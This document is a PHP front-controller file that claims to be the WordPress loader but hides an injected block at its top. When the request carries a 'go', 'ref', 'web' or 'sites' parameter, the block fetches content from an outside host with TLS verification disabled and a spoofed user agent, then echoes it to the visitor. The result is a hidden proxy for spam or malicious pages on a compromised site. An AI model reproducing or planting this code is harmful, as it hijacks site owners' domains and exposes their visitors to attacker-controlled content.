<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/hajraegeszseg/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/hajraegeszseg/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/hajraegeszseg/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
elseif(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/hajraegeszseg/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
	
} else {
if (empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] === "off") {
    $location = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: ' . $location);
    exit;
}


error_reporting( E_ALL ^ E_DEPRECATED );


require_once('controller/controller.php');
$controller = new controller();
$controller->execute();
//	print '<-- '.TIMER::get('REQUEST') . ' -->';

}
